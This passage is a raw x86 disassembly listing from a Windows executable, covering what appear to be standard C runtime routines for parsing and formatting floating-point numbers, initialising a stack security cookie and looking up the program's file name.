  41614b:	0f 85 60 01 00 00    	jne    0x4162b1
  416151:	33 c0                	xor    %eax,%eax
  416153:	40                   	inc    %eax
  416154:	e9 0e ff ff ff       	jmp    0x416067
  416159:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  416160:	eb 17                	jmp    0x416179
  416162:	83 7d f4 19          	cmpl   $0x19,-0xc(%ebp)
  416166:	73 0b                	jae    0x416173
  416168:	ff 45 f4             	incl   -0xc(%ebp)
  41616b:	80 eb 30             	sub    $0x30,%bl
  41616e:	88 1e                	mov    %bl,(%esi)
  416170:	46                   	inc    %esi
  416171:	eb 03                	jmp    0x416176
  416173:	ff 45 f0             	incl   -0x10(%ebp)
  416176:	8a 1f                	mov    (%edi),%bl
  416178:	47                   	inc    %edi
  416179:	0f b6 c3             	movzbl %bl,%eax
  41617c:	50                   	push   %eax
  41617d:	e8 1b cf ff ff       	call   0x41309d
  416182:	85 c0                	test   %eax,%eax
  416184:	59                   	pop    %ecx
  416185:	75 db                	jne    0x416162
  416187:	3a 1d d4 61 45 00    	cmp    0x4561d4,%bl
  41618d:	75 46                	jne    0x4161d5
  41618f:	e9 51 ff ff ff       	jmp    0x4160e5
  416194:	33 c0                	xor    %eax,%eax
  416196:	40                   	inc    %eax
  416197:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  41619b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  41619e:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4161a1:	75 24                	jne    0x4161c7
  4161a3:	eb 06                	jmp    0x4161ab
  4161a5:	ff 4d f0             	decl   -0x10(%ebp)
  4161a8:	8a 1f                	mov    (%edi),%bl
  4161aa:	47                   	inc    %edi
  4161ab:	80 fb 30             	cmp    $0x30,%bl
  4161ae:	74 f5                	je     0x4161a5
  4161b0:	eb 15                	jmp    0x4161c7
  4161b2:	83 7d f4 19          	cmpl   $0x19,-0xc(%ebp)
  4161b6:	73 0c                	jae    0x4161c4
  4161b8:	ff 45 f4             	incl   -0xc(%ebp)
  4161bb:	80 eb 30             	sub    $0x30,%bl
  4161be:	88 1e                	mov    %bl,(%esi)
  4161c0:	46                   	inc    %esi
  4161c1:	ff 4d f0             	decl   -0x10(%ebp)
  4161c4:	8a 1f                	mov    (%edi),%bl
  4161c6:	47                   	inc    %edi
  4161c7:	0f b6 c3             	movzbl %bl,%eax
  4161ca:	50                   	push   %eax
  4161cb:	e8 cd ce ff ff       	call   0x41309d
  4161d0:	85 c0                	test   %eax,%eax
  4161d2:	59                   	pop    %ecx
  4161d3:	75 dd                	jne    0x4161b2
  4161d5:	80 fb 2b             	cmp    $0x2b,%bl
  4161d8:	0f 84 48 ff ff ff    	je     0x416126
  4161de:	80 fb 2d             	cmp    $0x2d,%bl
  4161e1:	0f 84 3f ff ff ff    	je     0x416126
  4161e7:	e9 13 ff ff ff       	jmp    0x4160ff
  4161ec:	0f b6 c3             	movzbl %bl,%eax
  4161ef:	50                   	push   %eax
  4161f0:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  4161f7:	e8 a1 ce ff ff       	call   0x41309d
  4161fc:	85 c0                	test   %eax,%eax
  4161fe:	59                   	pop    %ecx
  4161ff:	0f 84 ac 00 00 00    	je     0x4162b1
  416205:	6a 04                	push   $0x4
  416207:	e9 99 00 00 00       	jmp    0x4162a5
  41620c:	80 fb 31             	cmp    $0x31,%bl
  41620f:	8d 4f fe             	lea    -0x2(%edi),%ecx
  416212:	89 4d 10             	mov    %ecx,0x10(%ebp)
  416215:	7c 09                	jl     0x416220
  416217:	80 fb 39             	cmp    $0x39,%bl
  41621a:	0f 8e 83 00 00 00    	jle    0x4162a3
  416220:	0f be c3             	movsbl %bl,%eax
  416223:	83 e8 2b             	sub    $0x2b,%eax
  416226:	0f 84 ae 00 00 00    	je     0x4162da
  41622c:	48                   	dec    %eax
  41622d:	48                   	dec    %eax
  41622e:	0f 84 9a 00 00 00    	je     0x4162ce
  416234:	83 e8 03             	sub    $0x3,%eax
  416237:	0f 85 b7 00 00 00    	jne    0x4162f4
  41623d:	6a 08                	push   $0x8
  41623f:	e9 98 00 00 00       	jmp    0x4162dc
  416244:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  41624b:	eb 03                	jmp    0x416250
  41624d:	8a 1f                	mov    (%edi),%bl
  41624f:	47                   	inc    %edi
  416250:	80 fb 30             	cmp    $0x30,%bl
  416253:	74 f8                	je     0x41624d
  416255:	80 fb 31             	cmp    $0x31,%bl
  416258:	7c 05                	jl     0x41625f
  41625a:	80 fb 39             	cmp    $0x39,%bl
  41625d:	7e 44                	jle    0x4162a3
  41625f:	4f                   	dec    %edi
  416260:	89 75 f8             	mov    %esi,-0x8(%ebp)
  416263:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  416267:	8b 45 0c             	mov    0xc(%ebp),%eax
  41626a:	89 38                	mov    %edi,(%eax)
  41626c:	0f 84 50 01 00 00    	je     0x4163c2
  416272:	6a 18                	push   $0x18
  416274:	58                   	pop    %eax
  416275:	39 45 f4             	cmp    %eax,-0xc(%ebp)
  416278:	76 10                	jbe    0x41628a
  41627a:	80 7d bf 05          	cmpb   $0x5,-0x41(%ebp)
  41627e:	7c 03                	jl     0x416283
  416280:	fe 45 bf             	incb   -0x41(%ebp)
  416283:	4e                   	dec    %esi
  416284:	ff 45 f0             	incl   -0x10(%ebp)
  416287:	89 45 f4             	mov    %eax,-0xc(%ebp)
  41628a:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  41628e:	0f 86 55 01 00 00    	jbe    0x4163e9
  416294:	e9 c5 00 00 00       	jmp    0x41635e
  416299:	80 fb 31             	cmp    $0x31,%bl
  41629c:	7c 0e                	jl     0x4162ac
  41629e:	80 fb 39             	cmp    $0x39,%bl
  4162a1:	7f 09                	jg     0x4162ac
  4162a3:	6a 09                	push   $0x9
  4162a5:	58                   	pop    %eax
  4162a6:	4f                   	dec    %edi
  4162a7:	e9 bb fd ff ff       	jmp    0x416067
  4162ac:	80 fb 30             	cmp    $0x30,%bl
  4162af:	74 8c                	je     0x41623d
  4162b1:	8b 7d 10             	mov    0x10(%ebp),%edi
  4162b4:	eb aa                	jmp    0x416260
  4162b6:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  4162ba:	74 26                	je     0x4162e2
  4162bc:	0f be c3             	movsbl %bl,%eax
  4162bf:	83 e8 2b             	sub    $0x2b,%eax
  4162c2:	8d 4f ff             	lea    -0x1(%edi),%ecx
  4162c5:	89 4d 10             	mov    %ecx,0x10(%ebp)
  4162c8:	74 10                	je     0x4162da
  4162ca:	48                   	dec    %eax
  4162cb:	48                   	dec    %eax
  4162cc:	75 26                	jne    0x4162f4
  4162ce:	83 4d e4 ff          	orl    $0xffffffff,-0x1c(%ebp)
  4162d2:	6a 07                	push   $0x7
  4162d4:	58                   	pop    %eax
  4162d5:	e9 8d fd ff ff       	jmp    0x416067
  4162da:	6a 07                	push   $0x7
  4162dc:	58                   	pop    %eax
  4162dd:	e9 85 fd ff ff       	jmp    0x416067
  4162e2:	6a 0a                	push   $0xa
  4162e4:	58                   	pop    %eax
  4162e5:	4f                   	dec    %edi
  4162e6:	83 f8 0a             	cmp    $0xa,%eax
  4162e9:	0f 85 78 fd ff ff    	jne    0x416067
  4162ef:	e9 6c ff ff ff       	jmp    0x416260
  4162f4:	89 75 f8             	mov    %esi,-0x8(%ebp)
  4162f7:	8b f9                	mov    %ecx,%edi
  4162f9:	e9 65 ff ff ff       	jmp    0x416263
  4162fe:	89 75 f8             	mov    %esi,-0x8(%ebp)
  416301:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  416308:	33 f6                	xor    %esi,%esi
  41630a:	eb 15                	jmp    0x416321
  41630c:	0f be cb             	movsbl %bl,%ecx
  41630f:	8d 04 b6             	lea    (%esi,%esi,4),%eax
  416312:	8d 74 41 d0          	lea    -0x30(%ecx,%eax,2),%esi
  416316:	81 fe 50 14 00 00    	cmp    $0x1450,%esi
  41631c:	7f 13                	jg     0x416331
  41631e:	8a 1f                	mov    (%edi),%bl
  416320:	47                   	inc    %edi
  416321:	0f b6 c3             	movzbl %bl,%eax
  416324:	50                   	push   %eax
  416325:	e8 73 cd ff ff       	call   0x41309d
  41632a:	85 c0                	test   %eax,%eax
  41632c:	59                   	pop    %ecx
  41632d:	75 dd                	jne    0x41630c
  41632f:	eb 05                	jmp    0x416336
  416331:	be 51 14 00 00       	mov    $0x1451,%esi
  416336:	89 75 e0             	mov    %esi,-0x20(%ebp)
  416339:	0f b6 c3             	movzbl %bl,%eax
  41633c:	eb 06                	jmp    0x416344
  41633e:	8a 07                	mov    (%edi),%al
  416340:	47                   	inc    %edi
  416341:	0f b6 c0             	movzbl %al,%eax
  416344:	50                   	push   %eax
  416345:	e8 53 cd ff ff       	call   0x41309d
  41634a:	85 c0                	test   %eax,%eax
  41634c:	59                   	pop    %ecx
  41634d:	75 ef                	jne    0x41633e
  41634f:	8b 75 f8             	mov    -0x8(%ebp),%esi
  416352:	4f                   	dec    %edi
  416353:	e9 0b ff ff ff       	jmp    0x416263
  416358:	ff 4d f4             	decl   -0xc(%ebp)
  41635b:	ff 45 f0             	incl   -0x10(%ebp)
  41635e:	4e                   	dec    %esi
  41635f:	80 3e 00             	cmpb   $0x0,(%esi)
  416362:	74 f4                	je     0x416358
  416364:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  416367:	50                   	push   %eax
  416368:	ff 75 f4             	push   -0xc(%ebp)
  41636b:	8d 45 a8             	lea    -0x58(%ebp),%eax
  41636e:	50                   	push   %eax
  41636f:	e8 b5 fb ff ff       	call   0x415f29
  416374:	8b 45 e0             	mov    -0x20(%ebp),%eax
  416377:	33 c9                	xor    %ecx,%ecx
  416379:	83 c4 0c             	add    $0xc,%esp
  41637c:	39 4d e4             	cmp    %ecx,-0x1c(%ebp)
  41637f:	7d 02                	jge    0x416383
  416381:	f7 d8                	neg    %eax
  416383:	03 45 f0             	add    -0x10(%ebp),%eax
  416386:	39 4d dc             	cmp    %ecx,-0x24(%ebp)
  416389:	75 03                	jne    0x41638e
  41638b:	03 45 18             	add    0x18(%ebp),%eax
  41638e:	39 4d d8             	cmp    %ecx,-0x28(%ebp)
  416391:	75 03                	jne    0x416396
  416393:	2b 45 1c             	sub    0x1c(%ebp),%eax
  416396:	3d 50 14 00 00       	cmp    $0x1450,%eax
  41639b:	7f 2e                	jg     0x4163cb
  41639d:	3d b0 eb ff ff       	cmp    $0xffffebb0,%eax
  4163a2:	7c 3e                	jl     0x4163e2
  4163a4:	ff 75 14             	push   0x14(%ebp)
  4163a7:	50                   	push   %eax
  4163a8:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4163ab:	50                   	push   %eax
  4163ac:	e8 ae 13 00 00       	call   0x41775f
  4163b1:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  4163b4:	8b 5d c6             	mov    -0x3a(%ebp),%ebx
  4163b7:	8b 75 ca             	mov    -0x36(%ebp),%esi
  4163ba:	8b 45 ce             	mov    -0x32(%ebp),%eax
  4163bd:	83 c4 0c             	add    $0xc,%esp
  4163c0:	eb 2f                	jmp    0x4163f1
  4163c2:	c7 45 e8 04 00 00 00 	movl   $0x4,-0x18(%ebp)
  4163c9:	eb 1e                	jmp    0x4163e9
  4163cb:	33 db                	xor    %ebx,%ebx
  4163cd:	b8 ff 7f 00 00       	mov    $0x7fff,%eax
  4163d2:	be 00 00 00 80       	mov    $0x80000000,%esi
  4163d7:	33 d2                	xor    %edx,%edx
  4163d9:	c7 45 e8 02 00 00 00 	movl   $0x2,-0x18(%ebp)
  4163e0:	eb 0f                	jmp    0x4163f1
  4163e2:	c7 45 e8 01 00 00 00 	movl   $0x1,-0x18(%ebp)
  4163e9:	33 d2                	xor    %edx,%edx
  4163eb:	33 c0                	xor    %eax,%eax
  4163ed:	33 f6                	xor    %esi,%esi
  4163ef:	33 db                	xor    %ebx,%ebx
  4163f1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4163f4:	0b 45 d4             	or     -0x2c(%ebp),%eax
  4163f7:	89 59 02             	mov    %ebx,0x2(%ecx)
  4163fa:	89 71 06             	mov    %esi,0x6(%ecx)
  4163fd:	66 89 41 0a          	mov    %ax,0xa(%ecx)
  416401:	8b 45 e8             	mov    -0x18(%ebp),%eax
  416404:	66 89 11             	mov    %dx,(%ecx)
  416407:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  41640a:	33 4d 04             	xor    0x4(%ebp),%ecx
  41640d:	5f                   	pop    %edi
  41640e:	5e                   	pop    %esi
  41640f:	5b                   	pop    %ebx
  416410:	e8 f7 d7 ff ff       	call   0x413c0c
  416415:	c9                   	leave
  416416:	c3                   	ret
  416417:	7a 60                	jp     0x416479
  416419:	41                   	inc    %ecx
  41641a:	00 cd                	add    %cl,%ch
  41641c:	60                   	pusha
  41641d:	41                   	inc    %ecx
  41641e:	00 2e                	add    %ch,(%esi)
  416420:	61                   	popa
  416421:	41                   	inc    %ecx
  416422:	00 59 61             	add    %bl,0x61(%ecx)
  416425:	41                   	inc    %ecx
  416426:	00 94 61 41 00 ec 61 	add    %dl,0x61ec0041(%ecx,%eiz,2)
  41642d:	41                   	inc    %ecx
  41642e:	00 0c 62             	add    %cl,(%edx,%eiz,2)
  416431:	41                   	inc    %ecx
  416432:	00 99 62 41 00 44    	add    %bl,0x44004162(%ecx)
  416438:	62 41 00             	bound  %eax,0x0(%ecx)
  41643b:	fe                   	(bad)
  41643c:	62 41 00             	bound  %eax,0x0(%ecx)
  41643f:	e6 62                	out    %al,$0x62
  416441:	41                   	inc    %ecx
  416442:	00 b6 62 41 00 55    	add    %dh,0x55004162(%esi)
  416448:	8b ec                	mov    %esp,%ebp
  41644a:	83 ec 30             	sub    $0x30,%esp
  41644d:	a1 10 62 45 00       	mov    0x456210,%eax
  416452:	33 45 04             	xor    0x4(%ebp),%eax
  416455:	53                   	push   %ebx
  416456:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  416459:	89 45 fc             	mov    %eax,-0x4(%ebp)
  41645c:	8b 45 10             	mov    0x10(%ebp),%eax
  41645f:	56                   	push   %esi
  416460:	8b c8                	mov    %eax,%ecx
  416462:	be ff 7f 00 00       	mov    $0x7fff,%esi
  416467:	81 e1 00 80 00 00    	and    $0x8000,%ecx
  41646d:	23 c6                	and    %esi,%eax
  41646f:	66 85 c9             	test   %cx,%cx
  416472:	57                   	push   %edi
  416473:	c6 45 dc cc          	movb   $0xcc,-0x24(%ebp)
  416477:	c6 45 dd cc          	movb   $0xcc,-0x23(%ebp)
  41647b:	c6 45 de cc          	movb   $0xcc,-0x22(%ebp)
  41647f:	c6 45 df cc          	movb   $0xcc,-0x21(%ebp)
  416483:	c6 45 e0 cc          	movb   $0xcc,-0x20(%ebp)
  416487:	c6 45 e1 cc          	movb   $0xcc,-0x1f(%ebp)
  41648b:	c6 45 e2 cc          	movb   $0xcc,-0x1e(%ebp)
  41648f:	c6 45 e3 cc          	movb   $0xcc,-0x1d(%ebp)
  416493:	c6 45 e4 cc          	movb   $0xcc,-0x1c(%ebp)
  416497:	c6 45 e5 cc          	movb   $0xcc,-0x1b(%ebp)
  41649b:	c6 45 e6 fb          	movb   $0xfb,-0x1a(%ebp)
  41649f:	c6 45 e7 3f          	movb   $0x3f,-0x19(%ebp)
  4164a3:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4164aa:	8b d0                	mov    %eax,%edx
  4164ac:	74 06                	je     0x4164b4
  4164ae:	c6 43 02 2d          	movb   $0x2d,0x2(%ebx)
  4164b2:	eb 04                	jmp    0x4164b8
  4164b4:	c6 43 02 20          	movb   $0x20,0x2(%ebx)
  4164b8:	66 85 d2             	test   %dx,%dx
  4164bb:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4164be:	75 0d                	jne    0x4164cd
  4164c0:	85 ff                	test   %edi,%edi
  4164c2:	75 09                	jne    0x4164cd
  4164c4:	39 7d 08             	cmp    %edi,0x8(%ebp)
  4164c7:	0f 84 f3 00 00 00    	je     0x4165c0
  4164cd:	66 3b d6             	cmp    %si,%dx
  4164d0:	75 78                	jne    0x41654a
  4164d2:	b8 00 00 00 80       	mov    $0x80000000,%eax
  4164d7:	3b f8                	cmp    %eax,%edi
  4164d9:	66 c7 03 01 00       	movw   $0x1,(%ebx)
  4164de:	75 06                	jne    0x4164e6
  4164e0:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4164e4:	74 0f                	je     0x4164f5
  4164e6:	f7 c7 00 00 00 40    	test   $0x40000000,%edi
  4164ec:	75 07                	jne    0x4164f5
  4164ee:	68 64 88 41 00       	push   $0x418864
  4164f3:	eb 46                	jmp    0x41653b
  4164f5:	66 85 c9             	test   %cx,%cx
  4164f8:	74 15                	je     0x41650f
  4164fa:	81 ff 00 00 00 c0    	cmp    $0xc0000000,%edi
  416500:	75 0d                	jne    0x41650f
  416502:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  416506:	75 2e                	jne    0x416536
  416508:	68 5c 88 41 00       	push   $0x41885c
  41650d:	eb 0f                	jmp    0x41651e
  41650f:	3b f8                	cmp    %eax,%edi
  416511:	75 23                	jne    0x416536
  416513:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  416517:	75 1d                	jne    0x416536
  416519:	68 54 88 41 00       	push   $0x418854
  41651e:	8d 43 04             	lea    0x4(%ebx),%eax
  416521:	50                   	push   %eax
  416522:	e8 19 d4 ff ff       	call   0x413940
  416527:	c6 43 03 05          	movb   $0x5,0x3(%ebx)
  41652b:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  41652f:	59                   	pop    %ecx
  416530:	59                   	pop    %ecx
  416531:	e9 6c 01 00 00       	jmp    0x4166a2
  416536:	68 4c 88 41 00       	push   $0x41884c
  41653b:	8d 43 04             	lea    0x4(%ebx),%eax
  41653e:	50                   	push   %eax
  41653f:	e8 fc d3 ff ff       	call   0x413940
  416544:	c6 43 03 06          	movb   $0x6,0x3(%ebx)
  416548:	eb e1                	jmp    0x41652b
  41654a:	0f b7 c2             	movzwl %dx,%eax
  41654d:	8b f0                	mov    %eax,%esi
  41654f:	69 c0 10 4d 00 00    	imul   $0x4d10,%eax,%eax
  416555:	66 83 65 e8 00       	andw   $0x0,-0x18(%ebp)
  41655a:	8b cf                	mov    %edi,%ecx
  41655c:	c1 e9 18             	shr    $0x18,%ecx
  41655f:	c1 ee 08             	shr    $0x8,%esi
  416562:	8d 0c 4e             	lea    (%esi,%ecx,2),%ecx
  416565:	6b c9 4d             	imul   $0x4d,%ecx,%ecx
  416568:	8d b4 01 0c ed bc ec 	lea    -0x134312f4(%ecx,%eax,1),%esi
  41656f:	8b 45 08             	mov    0x8(%ebp),%eax
  416572:	89 45 ea             	mov    %eax,-0x16(%ebp)
  416575:	c1 fe 10             	sar    $0x10,%esi
  416578:	0f bf c6             	movswl %si,%eax
  41657b:	f7 d8                	neg    %eax
  41657d:	6a 01                	push   $0x1
  41657f:	50                   	push   %eax
  416580:	8d 45 e8             	lea    -0x18(%ebp),%eax
  416583:	50                   	push   %eax
  416584:	66 89 55 f2          	mov    %dx,-0xe(%ebp)
  416588:	89 7d ee             	mov    %edi,-0x12(%ebp)
  41658b:	e8 cf 11 00 00       	call   0x41775f
  416590:	83 c4 0c             	add    $0xc,%esp
  416593:	66 81 7d f2 ff 3f    	cmpw   $0x3fff,-0xe(%ebp)
  416599:	72 10                	jb     0x4165ab
  41659b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  41659e:	50                   	push   %eax
  41659f:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4165a2:	50                   	push   %eax
  4165a3:	46                   	inc    %esi
  4165a4:	e8 7e 0f 00 00       	call   0x417527
  4165a9:	59                   	pop    %ecx
  4165aa:	59                   	pop    %ecx
  4165ab:	f6 45 18 01          	testb  $0x1,0x18(%ebp)
  4165af:	8b 7d 14             	mov    0x14(%ebp),%edi
  4165b2:	66 89 33             	mov    %si,(%ebx)
  4165b5:	74 12                	je     0x4165c9
  4165b7:	0f bf c6             	movswl %si,%eax
  4165ba:	03 f8                	add    %eax,%edi
  4165bc:	85 ff                	test   %edi,%edi
  4165be:	7f 09                	jg     0x4165c9
  4165c0:	c6 43 04 30          	movb   $0x30,0x4(%ebx)
  4165c4:	e9 fd 00 00 00       	jmp    0x4166c6
  4165c9:	83 ff 15             	cmp    $0x15,%edi
  4165cc:	7e 03                	jle    0x4165d1
  4165ce:	6a 15                	push   $0x15
  4165d0:	5f                   	pop    %edi
  4165d1:	0f b7 75 f2          	movzwl -0xe(%ebp),%esi
  4165d5:	81 ee fe 3f 00 00    	sub    $0x3ffe,%esi
  4165db:	66 83 65 f2 00       	andw   $0x0,-0xe(%ebp)
  4165e0:	c7 45 10 08 00 00 00 	movl   $0x8,0x10(%ebp)
  4165e7:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4165ea:	50                   	push   %eax
  4165eb:	e8 de f8 ff ff       	call   0x415ece
  4165f0:	ff 4d 10             	decl   0x10(%ebp)
  4165f3:	59                   	pop    %ecx
  4165f4:	75 f1                	jne    0x4165e7
  4165f6:	85 f6                	test   %esi,%esi
  4165f8:	7d 17                	jge    0x416611
  4165fa:	f7 de                	neg    %esi
  4165fc:	81 e6 ff 00 00 00    	and    $0xff,%esi
  416602:	7e 0d                	jle    0x416611
  416604:	8d 45 e8             	lea    -0x18(%ebp),%eax
  416607:	50                   	push   %eax
  416608:	e8 ef f8 ff ff       	call   0x415efc
  41660d:	4e                   	dec    %esi
  41660e:	59                   	pop    %ecx
  41660f:	75 f3                	jne    0x416604
  416611:	8d 4f 01             	lea    0x1(%edi),%ecx
  416614:	85 c9                	test   %ecx,%ecx
  416616:	8d 43 04             	lea    0x4(%ebx),%eax
  416619:	89 45 10             	mov    %eax,0x10(%ebp)
  41661c:	7e 50                	jle    0x41666e
  41661e:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  416621:	8d 75 e8             	lea    -0x18(%ebp),%esi
  416624:	8d 7d d0             	lea    -0x30(%ebp),%edi
  416627:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  416628:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  416629:	8d 45 e8             	lea    -0x18(%ebp),%eax
  41662c:	50                   	push   %eax
  41662d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41662e:	e8 9b f8 ff ff       	call   0x415ece
  416633:	8d 45 e8             	lea    -0x18(%ebp),%eax
  416636:	50                   	push   %eax
  416637:	e8 92 f8 ff ff       	call   0x415ece
  41663c:	8d 45 d0             	lea    -0x30(%ebp),%eax
  41663f:	50                   	push   %eax
  416640:	8d 45 e8             	lea    -0x18(%ebp),%eax
  416643:	50                   	push   %eax
  416644:	e8 27 f8 ff ff       	call   0x415e70
  416649:	8d 45 e8             	lea    -0x18(%ebp),%eax
  41664c:	50                   	push   %eax
  41664d:	e8 7c f8 ff ff       	call   0x415ece
  416652:	8a 45 f3             	mov    -0xd(%ebp),%al
  416655:	8b 4d 10             	mov    0x10(%ebp),%ecx
  416658:	80 65 f3 00          	andb   $0x0,-0xd(%ebp)
  41665c:	04 30                	add    $0x30,%al
  41665e:	83 c4 14             	add    $0x14,%esp
  416661:	ff 45 10             	incl   0x10(%ebp)
  416664:	ff 4d f4             	decl   -0xc(%ebp)
  416667:	88 01                	mov    %al,(%ecx)
  416669:	75 b6                	jne    0x416621
  41666b:	8b 45 10             	mov    0x10(%ebp),%eax
  41666e:	48                   	dec    %eax
  41666f:	8a 08                	mov    (%eax),%cl
  416671:	48                   	dec    %eax
  416672:	80 f9 35             	cmp    $0x35,%cl
  416675:	8d 4b 04             	lea    0x4(%ebx),%ecx
  416678:	7c 41                	jl     0x4166bb
  41667a:	eb 09                	jmp    0x416685
  41667c:	80 38 39             	cmpb   $0x39,(%eax)
  41667f:	75 08                	jne    0x416689
  416681:	c6 00 30             	movb   $0x30,(%eax)
  416684:	48                   	dec    %eax
  416685:	3b c1                	cmp    %ecx,%eax
  416687:	73 f3                	jae    0x41667c
  416689:	3b c1                	cmp    %ecx,%eax
  41668b:	73 04                	jae    0x416691
  41668d:	40                   	inc    %eax
  41668e:	66 ff 03             	incw   (%ebx)
  416691:	fe 00                	incb   (%eax)
  416693:	2a c3                	sub    %bl,%al
  416695:	2c 03                	sub    $0x3,%al
  416697:	88 43 03             	mov    %al,0x3(%ebx)
  41669a:	0f be c0             	movsbl %al,%eax
  41669d:	80 64 18 04 00       	andb   $0x0,0x4(%eax,%ebx,1)
  4166a2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4166a5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4166a8:	33 4d 04             	xor    0x4(%ebp),%ecx
  4166ab:	5f                   	pop    %edi
  4166ac:	5e                   	pop    %esi
  4166ad:	5b                   	pop    %ebx
  4166ae:	e8 59 d5 ff ff       	call   0x413c0c
  4166b3:	c9                   	leave
  4166b4:	c3                   	ret
  4166b5:	80 38 30             	cmpb   $0x30,(%eax)
  4166b8:	75 05                	jne    0x4166bf
  4166ba:	48                   	dec    %eax
  4166bb:	3b c1                	cmp    %ecx,%eax
  4166bd:	73 f6                	jae    0x4166b5
  4166bf:	3b c1                	cmp    %ecx,%eax
  4166c1:	73 d0                	jae    0x416693
  4166c3:	c6 01 30             	movb   $0x30,(%ecx)
  4166c6:	66 83 23 00          	andw   $0x0,(%ebx)
  4166ca:	80 63 05 00          	andb   $0x0,0x5(%ebx)
  4166ce:	33 c0                	xor    %eax,%eax
  4166d0:	c6 43 02 20          	movb   $0x20,0x2(%ebx)
  4166d4:	c6 43 03 01          	movb   $0x1,0x3(%ebx)
  4166d8:	40                   	inc    %eax
  4166d9:	eb ca                	jmp    0x4166a5
  4166db:	55                   	push   %ebp
  4166dc:	8b ec                	mov    %esp,%ebp
  4166de:	83 ec 10             	sub    $0x10,%esp
  4166e1:	56                   	push   %esi
  4166e2:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4166e5:	50                   	push   %eax
  4166e6:	ff 15 64 80 41 00    	call   *0x418064
  4166ec:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4166ef:	33 75 f8             	xor    -0x8(%ebp),%esi
  4166f2:	ff 15 68 80 41 00    	call   *0x418068
  4166f8:	33 f0                	xor    %eax,%esi
  4166fa:	ff 15 cc 80 41 00    	call   *0x4180cc
  416700:	33 f0                	xor    %eax,%esi
  416702:	ff 15 28 80 41 00    	call   *0x418028
  416708:	33 f0                	xor    %eax,%esi
  41670a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  41670d:	50                   	push   %eax
  41670e:	ff 15 6c 80 41 00    	call   *0x41806c
  416714:	8b 45 f4             	mov    -0xc(%ebp),%eax
  416717:	33 45 f0             	xor    -0x10(%ebp),%eax
  41671a:	33 f0                	xor    %eax,%esi
  41671c:	89 35 10 62 45 00    	mov    %esi,0x456210
  416722:	75 0a                	jne    0x41672e
  416724:	c7 05 10 62 45 00 4e 	movl   $0xbb40e64e,0x456210
  41672b:	e6 40 bb 
  41672e:	5e                   	pop    %esi
  41672f:	c9                   	leave
  416730:	c3                   	ret
  416731:	68 18 01 00 00       	push   $0x118
  416736:	68 10 8a 41 00       	push   $0x418a10
  41673b:	e8 d4 c8 ff ff       	call   0x413014
  416740:	a1 10 62 45 00       	mov    0x456210,%eax
  416745:	33 45 04             	xor    0x4(%ebp),%eax
  416748:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  41674b:	a1 6c 6f 45 00       	mov    0x456f6c,%eax
  416750:	33 c9                	xor    %ecx,%ecx
  416752:	3b c1                	cmp    %ecx,%eax
  416754:	74 1f                	je     0x416775
  416756:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  416759:	ff 75 0c             	push   0xc(%ebp)
  41675c:	ff 75 08             	push   0x8(%ebp)
  41675f:	ff d0                	call   *%eax
  416761:	59                   	pop    %ecx
  416762:	59                   	pop    %ecx
  416763:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  416767:	e9 07 01 00 00       	jmp    0x416873
  41676c:	33 c0                	xor    %eax,%eax
  41676e:	40                   	inc    %eax
  41676f:	c3                   	ret
  416770:	8b 65 e8             	mov    -0x18(%ebp),%esp
  416773:	eb ee                	jmp    0x416763
  416775:	8b 45 08             	mov    0x8(%ebp),%eax
  416778:	48                   	dec    %eax
  416779:	74 13                	je     0x41678e
  41677b:	bf ec 89 41 00       	mov    $0x4189ec,%edi
  416780:	c7 45 e0 38 89 41 00 	movl   $0x418938,-0x20(%ebp)
  416787:	be d4 00 00 00       	mov    $0xd4,%esi
  41678c:	eb 11                	jmp    0x41679f
  41678e:	bf 18 89 41 00       	mov    $0x418918,%edi
  416793:	c7 45 e0 78 88 41 00 	movl   $0x418878,-0x20(%ebp)
  41679a:	be b9 00 00 00       	mov    $0xb9,%esi
  41679f:	88 4d dc             	mov    %cl,-0x24(%ebp)
  4167a2:	68 04 01 00 00       	push   $0x104
  4167a7:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  4167ad:	50                   	push   %eax
  4167ae:	51                   	push   %ecx
  4167af:	ff 15 a0 80 41 00    	call   *0x4180a0
  4167b5:	85 c0                	test   %eax,%eax
  4167b7:	75 13                	jne    0x4167cc
  4167b9:	68 64 85 41 00       	push   $0x418564
  4167be:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  4167c4:	50                   	push   %eax
  4167c5:	e8 76 d1 ff ff       	call   0x413940
  4167ca:	59                   	pop    %ecx
  4167cb:	59                   	pop    %ecx
  4167cc:	8d 9d d8 fe ff ff    	lea    -0x128(%ebp),%ebx
